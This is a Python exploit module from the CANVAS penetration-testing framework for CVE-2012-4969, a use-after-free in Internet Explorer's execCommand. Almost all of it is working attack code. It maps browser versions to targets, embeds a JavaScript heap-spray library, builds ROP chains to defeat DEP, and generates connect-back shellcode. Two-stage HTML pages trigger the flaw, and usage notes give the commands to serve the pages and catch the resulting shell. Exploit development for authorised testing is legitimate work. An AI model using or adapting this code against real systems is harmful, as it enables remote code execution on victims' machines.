#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2010
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

import struct
from exploitutils import *
from tcpexploit import *
from httpclientside import httpclientside
from libs.jsobfuscate.jsobfuscate import JSObfuscator
from libs.spkproxy import header,body
from os import urandom
from encoder import *
import canvasengine
from random import randrange

NAME='ie_execCommand'
DESCRIPTION='IE execCommand() Use-After-Free exploit'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']='Microsoft'
DOCUMENTATION['Date public']='09/17/2012'
DOCUMENTATION['References']=['http://technet.microsoft.com/en-us/security/advisory/2757760']
DOCUMENTATION['Repeatability']='Infinite'
DOCUMENTATION['VersionsAffected']=''
DOCUMENTATION['CVE Name'] = 'CVE-2012-4969'
DOCUMENTATION['Notes'] = """
"""

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Clientside'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['XP', 'Vista', '7']
PROPERTY['MSADV']='MS12-063'
PROPERTY['DELIVERY']='HTTP'
PROPERTY["Notes"] = """

This exploit abuses a Use after free vulnerability when trying to call execCommand(). 
When using trigger events and executing a "selectall" command, the CMshtmlEd Object is freed 
only if content is written to the page via an onselect event. A corresponding cleanup
routine for the CMshtmlEd will try and delete the object via CMshtmlEd::Release() 
leading to a use of the dangling pointer.

NOTE: This exploit requires JAVA 6 <= update 29 installed on the target

Tested on:
* Windows XP Professional SP3 English with Internet Explorer 6
* Windows XP Professional SP3 English with Internet Explorer 7
* Windows XP Professional SP3 English with Internet Explorer 8
* Windows Vista English with Internet Explorer 7
* Windows Vista English with Internet Explorer 8
* Windows Vista English with Internet Explorer 9
* Windows 7 English with Internet Explorer 8
* Windows 7 English with Internet Explorer 9

- IE7/8
    - This exploit works well using js_recon
    - Template does not matter for this target
    - ./exploits/clientd/clientd.py -l 10.1.1.7 -d 5555 -O server_port:8080 -O allowed_attack_modules:ie_execCommand -O auto_detect_exploits:0 -O always_do_recon:True
- IE9
    - Its best to use the exploit as the template itself
    - The exploit works best when the client has visited a few sites and built up there heap allocations :>
    - ./exploits/clientd/clientd.py -l 10.1.1.7 -d 5555 -O server_port:8080 -O allowed_attack_modules:ie_execCommand -O auto_detect_exploits:0 -O always_do_recon:False -O direct_response:1 -O redirect:0

catch the shell:
./commandlineInterface.py -v17 -p5555

"""

NOTES="""
"""

CHANGELOG="""
"""

targets={
    0:['N/A', None, 0]
}

import string, random
class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)
        self.version      = 0
        self.name         = NAME
        self.ranCase      = string.ascii_lowercase + string.ascii_uppercase + string.digits 
        self.filename     = "".join( [ random.choice(self.ranCase) for x in range(8) ] ) + ".html"
        self.trigger      = "".join( [ random.choice(self.ranCase) for x in range(8) ] ) + ".html"
        self.objRepOne    = "".join( [ random.choice(self.ranCase) for x in range(4) ] )
        self.objRepTwo    = "".join( [ random.choice(self.ranCase) for x in range(59) ] )
        self.funcA        = "".join( [ random.choice(string.ascii_lowercase) for x in range(8) ] )
        self.funcB        = "".join( [ random.choice(string.ascii_lowercase) for x in range(8) ] )
        self.heap_chunk   = "".join( [ random.choice(string.ascii_lowercase) for x in range(8) ] )
        self.hc_src       = "".join( [ random.choice(string.ascii_lowercase) for x in range(1) ] )
        self.browserTargets            = [
                                [ 'Automatic', {} ],
                                [
                                        'IE 6 on Windows XP SP3',
                                        {
                                                'Rop'    : False,
                                                'ASLR'   : False,
                                                'Offset' : 0x5fa, 
                                                'Random' : False
                                        }
                                ],
                                [
                                        'IE 7 on Windows XP SP3',
                                        {
                                                'Rop'    : False,
                                                'ASLR'   : False,
                                                'Offset' : 0x5fa, 
                                                'Random' : False
                                        }
                                ],
                                [
                                        'IE 8 on Windows XP SP3',
                                        {
                                                'Rop'    : "msvcrt",
                                                'ASLR'   : False,
                                                'Offset' : 0x5f4,
                                                'Random' : False
                                        }
                                ],
                                [
                                        'IE 7 on Windows Vista SP2',
                                        {
                                                'Rop'    : False,
                                                'ASLR'   : True,
                                                'Offset' : 0x5fa,
                                                'Random' : False
                                                
                                        }
                                ],
                                [
                                        'IE 8 on Windows Vista SP2',
                                        {
                                                'Rop'    : "jre",
                                                'ASLR'   : True,
                                                'Offset' : 0x5f4,
                                                'Random' : False
                                                
                                        }
                                ],
                                [
                                        'IE 9 on Windows Vista SP2',
                                        {
                                                'Rop'    : "jre",
                                                'ASLR'   : True,
                                                'Offset' : 0x5fc,
                                                'Random' : True
                                        }
                                ],
                                [
                                        'IE 8 on Windows 7 SP1',
                                        {
                                                'Rop'    : "jre",
                                                'ASLR'   : True,
                                                'Offset' : 0x5f4,
                                                'Random' : False
                                        }
                                ],
                                [
                                        'IE 9 on Windows 7 SP1',
                                        {
                                                'Rop'    : "jre",
                                                'ASLR'   : True,
                                                'Offset' : 0x5fc,
                                                'Random' : True
                                        }
                                ]        
                              ]
        # set the default target
        self.browserTarget = self.browserTargets[0]
        self.plugin_info   = None # we want clientd to give us a plugin dict
        return
    
    # set the target based on the supplied UserAgent
    def setTarget(self, ua):
        # ie6 + xp
        if "MSIE 6.0" in ua and "NT 5.1" in ua:
            self.browserTarget = self.browserTargets[1]
        # ie6 + XP
        elif "MSIE 6.1" in ua and "NT 5.1" in ua:
            self.browserTarget = self.browserTargets[1]
        # ie7 + XP
        elif "MSIE 7.0" in ua and "NT 5.1" in ua: 
            self.browserTarget = self.browserTargets[2]
        # ie8 + XP
        elif "MSIE 8.0" in ua and "NT 5.1" in ua:
            self.browserTarget = self.browserTargets[3]
        # ie7 + vista
        elif "MSIE 7.0" in ua and "NT 6.0" in ua:
            self.browserTarget = self.browserTargets[4]
        # ie8 + vista
        elif "MSIE 8.0" in ua and "NT 6.0" in ua:
            self.browserTarget = self.browserTargets[5]
        # ie9 + vista
        elif "MSIE 9.0" in ua and "NT 6.0" in ua:
            self.browserTarget = self.browserTargets[6]
        # ie8 + win7
        elif "MSIE 8.0" in ua and "NT 6.1" in ua:
            self.browserTarget = self.browserTargets[7]
        # ie9 + win7
        elif "MSIE 9.0" in ua and "NT 6.1" in ua:
            self.browserTarget = self.browserTargets[8]
        
    # check for IE versions and NT versions
    def is_vulnerable(self, clientdata):
        ua = clientdata['user_agent']
        # ie6 + xp
        if "MSIE 6.0" in ua and "NT 5.1" in ua:
            return 1
        # ie6 + XP
        elif "MSIE 6.1" in ua and "NT 5.1" in ua:
            return 1
        # ie7 + XP
        elif "MSIE 7.0" in ua and "NT 5.1" in ua:
            return 1
        # ie8 + XP
        elif "MSIE 8.0" in ua and "NT 5.1" in ua:
            return 1
        # ie7 + vista
        elif "MSIE 7.0" in ua and "NT 6.0" in ua:
            return 1
        # ie8 + vista
        elif "MSIE 8.0" in ua and "NT 6.0" in ua:
            return 1
        # ie9 + vista
        elif "MSIE 9.0" in ua and "NT 6.0" in ua:
            return 1
        # ie8 + win7
        elif "MSIE 8.0" in ua and "NT 6.1" in ua:
            return 1
        # ie9 + win7
        elif "MSIE 9.0" in ua and "NT 6.1" in ua:
            return 1
        # else, I have nfi bud
        else:
            self.log("Not IE 6/7/8/9 on Windows XP/Vista/win7 - The target is still possibly vulnerable, but not to this exploit")
            return 0

    # junk dword
    def jdw(self):
        return randrange(0xffffffff)
    
    # lame but meh.
    def nop(self):
        return 0x0c0c0c0c

    def generate_spray(self):

        JavaScriptHeapSpray = """
        //   JavaScript Heap Exploitation library
        //   by Alexander Sotirov <asotirov@determina.com>
        //  
        //   Version 0.3
        //
        // Copyright (c) 2007, Alexander Sotirov
        // All rights reserved.
        // 
        // The HeapLib library is licensed under a BSD license, the text of which follows:
        // 
        // Redistribution and use in source and binary forms, with or without
        // modification, are permitted provided that the following conditions
        // are met:
        // 
        // 1. Redistributions of source code must retain the above copyright
        //    notice, this list of conditions and the following disclaimer.
        // 2. Redistributions in binary form must reproduce the above copyright
        //    notice, this list of conditions and the following disclaimer in the
        //    documentation and/or other materials provided with the distribution.
        // 3. Neither the name of Alexander Sotirov nor the name of Determina Inc.
        //    may be used to endorse or promote products derived from this software
        //    without specific prior written permission.
        // 
        // THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
        // AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
        // IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
        // ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE
        // LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
        // CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
        // SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
        // INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
        // CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
        // ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
        // POSSIBILITY OF SUCH DAMAGE.

        function heapLib() {
        }
        
        heapLib.ie = function(maxAlloc, heapBase) {
        
            this.maxAlloc = (maxAlloc ? maxAlloc : 65535);
            this.heapBase = (heapBase ? heapBase : 0x150000);
        
            // Allocate a padding string that uses maxAlloc bytes
            this.paddingStr = "AAAA";
        
            while (4 + this.paddingStr.length*2 + 2 < this.maxAlloc) {
                this.paddingStr += this.paddingStr;
            }
            
            // Create an array for storing references to allocated memory
            this.mem = new Array();
        
            // Call flushOleaut32() once to allocate the maximum size blocks
            this.flushOleaut32();
        }
        
        heapLib.ie.prototype.debug = function(msg) {
            void(Math.atan2(0xbabe, msg));
        }    
                
        heapLib.ie.prototype.debugHeap = function(enable) {
        
            if (enable == true)
                void(Math.atan(0xbabe));
            else
                void(Math.asin(0xbabe));
        }
                
        heapLib.ie.prototype.debugBreak = function(msg) {
            void(Math.acos(0xbabe));
        }
                
        heapLib.ie.prototype.padding = function(len) {
            if (len > this.paddingStr.length)
                throw "Requested padding string length " + len + ", only " + this.paddingStr.length + " available";
        
            return this.paddingStr.substr(0, len);
        }    
                
        heapLib.ie.prototype.round = function(num, round) {
            if (round == 0)
                throw "Round argument cannot be 0";
        
            return parseInt((num + (round-1)) / round) * round;
        }    
        
        heapLib.ie.prototype.hex = function(num, width)
        {
            var digits = "0123456789ABCDEF";
        
            var hex = digits.substr(num & 0xF, 1);
        
            while (num > 0xF) {
                num = num >>> 4;
                hex = digits.substr(num & 0xF, 1) + hex;
            }
        
            var width = (width ? width : 0);
        
            while (hex.length < width)
                hex = "0" + hex;
        
            return hex;
        }    
        
        heapLib.ie.prototype.addr = function(addr) {
            return unescape("%u" + this.hex(addr & 0xFFFF, 4) + "%u" + this.hex((addr >> 16) & 0xFFFF, 4));
        }
        
        heapLib.ie.prototype.allocOleaut32 = function(arg, tag) {
        
            var size;
        
            // Calculate the allocation size
            if (typeof arg == "string" || arg instanceof String)
                size = 4 + arg.length*2 + 2;    // len + string data + null terminator
            else
                size = arg;
        
            // Make sure that the size is valid
            if ((size & 0xf) != 0)
                throw "Allocation size " + size + " must be a multiple of 16";
        
            // Create an array for this tag if doesn't already exist
            if (this.mem[tag] === undefined)
                this.mem[tag] = new Array();
        
            if (typeof arg == "string" || arg instanceof String) {
                // Allocate a new block with strdup of the string argument
                this.mem[tag].push(arg.substr(0, arg.length));
            }
            else {
                // Allocate the block
                this.mem[tag].push(this.padding((arg-6)/2));
            }
        }
        
        heapLib.ie.prototype.freeOleaut32 = function(tag) {
        
            delete this.mem[tag];
            
            // Run the garbage collector
            CollectGarbage();
        }
        
        heapLib.ie.prototype.flushOleaut32 = function() {
        
            this.debug("Flushing the OLEAUT32 cache");
        
            // Free the maximum size blocks and push out all smaller blocks
        
            this.freeOleaut32("oleaut32");
            
            // Allocate the maximum sized blocks again, emptying the cache
        
            for (var i = 0; i < 6; i++) {
                this.allocOleaut32(32, "oleaut32");
                this.allocOleaut32(64, "oleaut32");
                this.allocOleaut32(256, "oleaut32");
                this.allocOleaut32(32768, "oleaut32");
            }
        }
                
        heapLib.ie.prototype.alloc = function(arg, tag) {
        
            var size;
        
            // Calculate the allocation size
            if (typeof arg == "string" || arg instanceof String)
                size = 4 + arg.length*2 + 2;    // len + string data + null terminator
            else
                size = arg;
        
            // Make sure that the size is valid
            if (size == 32 || size == 64 || size == 256 || size == 32768)
                throw "Allocation sizes " + size + " cannot be flushed out of the OLEAUT32 cache";
        
            // Allocate the block with the OLEAUT32 allocator
            this.allocOleaut32(arg, tag);
        }    
        
        heapLib.ie.prototype.free = function(tag) {
        
            // Free the blocks with the OLEAUT32 free function
            this.freeOleaut32(tag);
        
            // Flush the OLEAUT32 cache
            this.flushOleaut32();
        }
        
        heapLib.ie.prototype.gc = function() {
        
            this.debug("Running the garbage collector");
            CollectGarbage();
        
            this.flushOleaut32();
        }
        
        heapLib.ie.prototype.freeList = function(arg, count) {
        
            var count = (count ? count : 1);
        
            for (var i = 0; i < count; i++) {
                this.alloc(arg);
                this.alloc(arg, "freeList");
            }
            this.alloc(arg);
        
            this.free("freeList");
        }
        
        heapLib.ie.prototype.lookaside = function(arg, count) {
        
            var size;
        
            // Calculate the allocation size
            if (typeof arg == "string" || arg instanceof String)
                size = 4 + arg.length*2 + 2;    // len + string data + null terminator
            else
                size = arg;
        
            // Make sure that the size is valid
            if ((size & 0xf) != 0)
                throw "Allocation size " + size + " must be a multiple of 16";
        
            if (size+8 >= 1024)
                throw("Maximum lookaside block size is 1008 bytes");
        
            var count = (count ? count : 1);
        
            for (var i = 0; i < count; i++)
                this.alloc(arg, "lookaside");
        
            this.free("lookaside");
        }
        
        heapLib.ie.prototype.lookasideAddr = function(arg)
        {
            var size;
        
            // Calculate the allocation size
            if (typeof arg == "string" || arg instanceof String)
                size = 4 + arg.length*2 + 2;    // len + string data + null terminator
            else
                size = arg;
        
            // Make sure that the size is valid
            if ((size & 0xf) != 0)
                throw "Allocation size " + size + " must be a multiple of 16";
        
            if (size+8 >= 1024)
                throw("Maximum lookaside block size is 1008 bytes");
        
            // The lookahead array starts at heapBase + 0x688. It contains a 48 byte
            // structure for each block size + header size in 8 byte increments.
        
            return this.heapBase + 0x688 + ((size+8)/8)*48;
        }
    """
    
        JavaScriptHeapSpray = JavaScriptHeapSpray.replace("    ","")
        
        if self.browserTarget[1]["Random"]:
            JavaScriptHeapSpray += """
            function randomblock(blocksize)
            {
                var theblock = "";
                for (var i = 0; i < blocksize; i++)
                {
                        theblock += Math.floor(Math.random()*90)+10;
                }
                return theblock;
            }
        
            function tounescape(block)
            {
                var blocklen = block.length;
                var unescapestr = "";
                for (var i = 0; i < blocklen-1; i=i+4)
                {
                        unescapestr += "%%u" + block.substring(i,i+4);
                }
                return unescapestr;
            }
        
            var heap_obj = new heapLib.ie(0x10000);
        
            var code = unescape("%s");
            var nops = unescape("%s");
        
            while (nops.length < 0x80000) nops += nops;
        
            var offset_length = 0x%x;
        
            for (var i=0; i < 0x1000; i++) {
                var padding = unescape(tounescape(randomblock(0x1000)));
                while (padding.length < 0x1000) padding+= padding;
                var junk_offset = padding.substring(0, offset_length);
                var single_sprayblock = junk_offset + code + nops.substring(0, 0x800 - code.length - junk_offset.length);
                while (single_sprayblock.length < 0x20000) single_sprayblock += single_sprayblock;
                sprayblock = single_sprayblock.substring(0, (0x40000-6)/2);
                heap_obj.alloc(sprayblock);
            }""" % (urluencode(self.shellcode), \
                    urluencode(struct.pack('<L', self.nop())), \
                    self.browserTarget[1]["Offset"])         
        # if ie6/7/8
        elif not self.browserTarget[1]["Random"]:
            
            JavaScriptHeapSpray += """
            var heap_obj = new heapLib.ie(0x20000);
            var code = unescape("%s");
            var nops = unescape("%s");

            while (nops.length < 0x80000) nops += nops;
            var offset = nops.substring(0, 0x%x);
            var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);

            while (shellcode.length < 0x40000) shellcode += shellcode;
            var block = shellcode.substring(0, (0x80000-6)/2);

            heap_obj.gc();

            for (var i=1; i < 0x300; i++) {
                    heap_obj.alloc(block);
            }

            var overflow = nops.substring(0, 10);""" % (
                urluencode(self.shellcode), \
                urluencode(struct.pack('<L', self.nop())), \
                self.browserTarget[1]["Offset"]
                )

        JavaScriptHeapSpray = JavaScriptHeapSpray.replace("        ", "")
        return JavaScriptHeapSpray
        
    def generateStageOneCode(self):
        self.log("Generating stage 1 shellcode")
        self.log("Detect browser as: %s" % self.browserTarget[0])
        stack_pivot = []
        rop_code    = []

        rop         = ""
        
        
        # No rop. Just return ""
        if not self.browserTarget[1]["Rop"]:
            return rop
        
        # fuck I hate exploiting this via a static DLL
        if self.browserTarget[1]['Rop'] == "msvcrt":
            self.log("Using msvcrt ROP")
            exec_size = len(self.shellcode)
            junkdword = self.jdw()
            
            stack_pivot = [
                0x77c4e393, # RETN
                0x77c4e392, # POP EAX # RETN
                0x77c15ed5, # XCHG EAX, ESP # RETN
            ]
            rop_code = [
                0x77C21891,  # POP ESI # RETN
                0x0c0c0c04,  # ESI
                0x77c4e392,  # POP EAX # RETN
                0x77c11120,  # <- *&VirtualProtect()
                0x77c2e493,  # MOV EAX,DWORD PTR DS:[EAX] # POP EBP # RETN
                self.jdw(),  # junk dword
                0x77c2dd6c,  # XCHG EAX,ESI # ADD [EAX], AL # RETN
                0x77c4ec00,  # POP EBP # RETN
                0x77c35459,  # ptr to 'push esp #  ret'
                0x77c47705,  # POP EBX # RETN
                exec_size,   # EBX
                0x77c3ea01,  # POP ECX # RETN
                0x77c5d000,  # W pointer (lpOldProtect) (-> ecx)
                0x77c46100,  # POP EDI # RETN
                0x77c46101,  # ROP NOP (-> edi)
                0x77c4d680,  # POP EDX # RETN
                0x00000040,  # newProtect (0x40) (-> edx)
                0x77c4e392,  # POP EAX # RETN
                0x90909090,  # NOPS (-> eax)
                0x77c12df9,  # PUSHAD # RETN
            ]
            
        # fuck I hate exploiting this via a static DLL
        elif self.browserTarget[1]['Rop'] == "jre":
            self.log("Using JRE ROP")
            exec_size = 0xffffffff - len(self.shellcode) + 1
            if self.browserTarget[1]['Random']:
                stack_pivot = [
                    0x0c0c0c0c, # 0c0c0c08
                    0x7c347f98, # RETN
                    0x7c347f97, # POP EDX # RETN
                    0x7c348b05  # XCHG EAX, ESP # RET
                ]
                
            else:
                stack_pivot = [
                    0x7c347f98, # RETN
                    0x7c347f97, # POP EDX # RETN
                    0x7c348b05  # XCHG EAX, ESP # RET
                ]
                
                rop_code = [
                    0x7c37653d,  # POP EAX # POP EDI # POP ESI # POP EBX # POP EBP # RETN
                    exec_size,   # Value to negate, will become 0x00000201 (dwSize)
                    0x7c347f98,  # RETN (ROP NOP)
                    0x7c3415a2,  # JMP [EAX]
                    0xffffffff,
                    0x7c376402,  # skip 4 bytes
                    0x7c351e05,  # NEG EAX # RETN
                    0x7c345255,  # INC EBX # FPATAN # RETN
                    0x7c352174,  # ADD EBX,EAX # XOR EAX,EAX # INC EAX # RETN
                    0x7c344f87,  # POP EDX # RETN
                    0xffffffc0,  # Value to negate, will become 0x00000040
                    0x7c351eb1,  # NEG EDX # RETN
                    0x7c34d201,  # POP ECX # RETN
                    0x7c38b001,  # &Writable location
                    0x7c347f97,  # POP EAX # RETN
                    0x7c37a151,  # ptr to &VirtualProtect() - 0x0EF [IAT msvcr71.dll]
                    0x7c378c81,  # PUSHAD # ADD AL,0EF # RETN
                    0x7c345c30,  # ptr to 'push esp #  ret '
                ]

        for pivot in stack_pivot:
            rop += struct.pack('<L', pivot)
        for dword in rop_code:
            rop += struct.pack('<L', dword)
        return rop

    # create all our shellcode
    def createAndEncodeShellcode(self):
        sc = shellcodeGenerator.win32()
        sc.addAttr('findeipnoesp', {'subespval': 3500})
        sc.addAttr('revert_to_self_before_importing_ws2_32', None)
        sc.addAttr('tcpconnect', {'port' : self.callback.port, 
                                  'ipaddress' : self.callback.ip})
        mosdef_type = self.engine.getMosdefType(canvasengine.WIN32MOSDEF_INTEL)
        mosdef_id = self.engine.getNewMosdefID(self)
        sc.addAttr("send_universal", {"mosdef_type": mosdef_type, "mosdef_id": mosdef_id})
        sc.addAttr("RecvExecDepSafe",{'socketreg': 'FDSPOT'})
        sc.addAttr("ExitThread",None)
        sc.vAllocSelf = False
        self.shellcode = sc.get()

        # build our rop payload with MOSDEF
        self.shellcode = self.generateStageOneCode() + self.shellcode
    
    def makefile(self, request_header=None, stage=1):
        """
        Makes the exploit HTML
        """
        self.getArgs()
        if not hasattr(self, "shellcode") or not self.shellcode:
            self.log("Regenerating shellcode in makefile")
            self.createShellcode()
            
        if stage == 1:
            filedata="""
            <html>
            <body>
        <script>    
        var %s = new Array();
        %s[0] = window.document.createElement("img");
        %s[0]["src"] = "%s";
        </script>
            <iframe src="/%s"></iframe>
        <script>
        %s
        </script>        
            <body>
            </html>""" % (self.heap_chunk, self.heap_chunk, self.heap_chunk, \
                      self.hc_src, self.trigger, self.generate_spray())
            
        elif stage == 2:
        
            filedata="""
            <html>
            <script>
            function %s() {
                // Triggers the CMshtmlEd::Exec function
                // Forces the onselect event to fire before the 
                // CMshtmlEd object is released
        document.execCommand("selectAll");
            };

            function %s() {
        
                // Triggers CMshtmlEd::Release()
        document.write("n");
                
                // we replace the freed Object here
            parent.%s[0].src = "%s\\u0c08\\u0c0c%s";
            
            };
            </script>
            <body onload='%s();' onselect='%s();'>
            // we need at least a comment in the body to 
            // trigger the onload/onselect events
            </body>
    </html>""" % ( self.funcB, self.funcA, self.heap_chunk, \
                          self.objRepOne, self.objRepTwo, self.funcB, \
                      self.funcA )
            
        filedata = filedata.replace("            ", "")
        return filedata

    def makesploit(self,clientheader,clientbody):
        h=header('SERVER')
        b=body()
    
        # set up the browser target
        ua = clientheader.getHeaderValue('User-Agent')
        self.setTarget(ua)
        
        if self.plugin_info:
            info_dict=self.plugin_info
            self.log("We got a plugin info for this target - thanks clientd!")
            
            if self.is_vulnerable(self.plugin_info):
                self.log("This client is most likely vulnerable!")
            else:
                self.log("Bailing on this client as it is not likely to be vulnerable (%s)" % self.plugin_info.get("language"))
                return None, None
            
        if clientheader.URL.count(self.filename):
            self.log('Serving stage 1 HTML file')
            self.createAndEncodeShellcode()
            stage1html = self.makefile(request_header = clientheader, stage=1)
            b.setBody(stage1html)
            h.addHeader('Content-Type','text/html')
        elif clientheader.URL.count(self.trigger):
            self.log('Serving stage 2 HTML file')
            stage2html = self.makefile(request_header = clientheader, stage=2)
            b.setBody(stage2html)
            h.addHeader('Content-Type','text/html')
        else:
            self.log('redirecting to self')
            h.status='302'
            h.addHeader('Location',self.filename)
            h.addHeader('Content-Type','text/html')
        return h,b

    def neededListenerTypes(self):
        return self.clientSideListenerTypes()
        
    def getArgs(self):
        self.host=self.target.interface
        self.getarg("filename")
        return
        
    def displayVersions(self):
        for t in targets.keys():
            print 'Version %d: %s'%(t,targets[t][0])
        return

    def run(self):
        self.getArgs()
        
        # Build the html that triggers the vulnerability
        filedata=self.makefile()
        
        self.log('Opening %s for output'%(self.filename))
        
        fd=file(self.filename,'wb+')
        fd.write(filedata)
        fd.close()
        self.log('Wrote to %s'%(self.filename))
        return 1

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
